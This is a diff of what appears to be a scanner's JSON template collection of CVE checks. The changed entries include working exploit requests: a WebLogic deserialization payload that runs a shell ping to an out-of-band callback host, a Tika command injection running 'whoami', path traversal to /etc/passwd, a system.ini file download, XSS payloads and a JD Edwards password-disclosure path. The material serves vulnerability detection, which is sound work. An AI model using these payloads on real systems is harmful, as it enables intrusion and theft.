@@ -5176,7 +5176,7 @@
       "requests": [
         {
           "raw": [
-            "POST /wls-wsat/CoordinatorPortType HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nAccept-Language: en\nContent-Type: text/xml\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soapenv:Envelope\n    xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n    <soapenv:Header>\n        <work:WorkContext\n            xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n            <java version=\"1.4.0\" class=\"java.beans.XMLDecoder\">\n                <void class=\"java.lang.ProcessBuilder\">\n                    <array class=\"java.lang.String\" length=\"3\">\n                        <void index=\"0\">\n                            <string>/bin/bash</string>\n                        </void>\n                        <void index=\"1\">\n                            <string>-c</string>\n                        </void>\n                        <void index=\"2\">\n                            <string>interact.sh</string>\n                        </void>\n                    </array>\n                    <void method=\"start\"/></void>\n            </java>\n        </work:WorkContext>\n    </soapenv:Header>\n    <soapenv:Body/>\n</soapenv:Envelope>\n",
+            "POST /wls-wsat/CoordinatorPortType HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nAccept-Language: en\nContent-Type: text/xml\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soapenv:Envelope\n    xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n    <soapenv:Header>\n        <work:WorkContext\n            xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n            <java version=\"1.4.0\" class=\"java.beans.XMLDecoder\">\n                <void class=\"java.lang.ProcessBuilder\">\n                    <array class=\"java.lang.String\" length=\"3\">\n                        <void index=\"0\">\n                            <string>/bin/bash</string>\n                        </void>\n                        <void index=\"1\">\n                            <string>-c</string>\n                        </void>\n                        <void index=\"2\">\n                            <string>ping -c 1 {{interactsh-url}}</string>\n                        </void>\n                    </array>\n                    <void method=\"start\"/></void>\n            </java>\n        </work:WorkContext>\n    </soapenv:Header>\n    <soapenv:Body/>\n</soapenv:Envelope>\n",
             "POST /wls-wsat/CoordinatorPortType HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nAccept-Language: en\nContent-Type: text/xml\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n  <soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n      <soapenv:Header>\n          <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n              <java>\n                  <void class=\"java.lang.Thread\" method=\"currentThread\">\n                      <void method=\"getCurrentWork\">\n                          <void method=\"getResponse\">\n                              <void method=\"getServletOutputStream\">\n                                  <void method=\"flush\"/>\n                              </void>\n                              <void method=\"getWriter\"><void method=\"write\"><string>{{randstr}}</string></void></void>\n                          </void>\n                      </void>\n                  </void>\n              </java>\n          </work:WorkContext>\n      </soapenv:Header>\n      <soapenv:Body/>\n</soapenv:Envelope>\n"
           ]
         }
@@ -5964,7 +5964,7 @@
     {
       "id": "CVE-2017-8917",
       "info": {
-        "name": "Joomla! <3.7.1 - SQL Injection",
+        "name": "Joomla! < 3.7.1 - SQL Injection",
         "severity": "critical"
       },
       "requests": [
@@ -6694,11 +6694,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
-            "Connection": "close",
-            "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
-            "Content-type": "image/jp2"
+            "Content-type": "image/jp2",
+            "Connection": "close",
+            "X-Tika-OCRTesseractPath": "cscript"
           },
           "method": "PUT",
           "path": [
@@ -12128,9 +12128,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
+            "Cookie": "Login",
             "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
-            "content-type": "text/xml",
-            "Cookie": "Login"
+            "content-type": "text/xml"
           },
           "method": "POST",
           "path": [
@@ -12268,6 +12268,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/index.php?page=&action=edit&f1=.//./\\.//./\\.//./\\.//./\\.//./\\.//./etc/passwd&restore=1"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-2733",
+      "info": {
+        "name": "JD Edwards EnterpriseOne Tools - Admin Password Disclosure",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/manage/fileDownloader?sec=1"
           ]
         }
       ]
@@ -17339,14 +17354,14 @@
     {
       "id": "CVE-2021-39320",
       "info": {
-        "name": "WordPress underConstruction Plugin< 1.19 - Cross-Site Scripting",
+        "name": "WordPress underConstruction Plugin < 1.19 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
         {
-          "method": "GET",
-          "path": [
-            "{{BaseURL}}/wp-admin/admin.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E/?page=under-construction"
+          "raw": [
+            "POST /wp-login.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nlog={{username}}&pwd={{password}}&wp-submit=Log+In\n",
+            "GET /wp-admin/admin.php/\"><script>alert(document.domain)</script>/?page=under-construction HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
@@ -17904,7 +17919,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/lostpassword.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+            "{{BaseURL}}/lostpassword.php/n4gap%22%3E%3Cimg%20src=a%20onerror=alert(%22document.domain%22)%3E"
           ]
         }
       ]
@@ -20912,7 +20927,7 @@
     {
       "id": "CVE-2022-31373",
       "info": {
-        "name": "SolarView Compact 6.00 - Cross-Site Scripting",
+        "name": "SolarView Compact 6.00 - Cross-Site Scripting(XSS)",
         "severity": "medium"
       },
       "requests": [
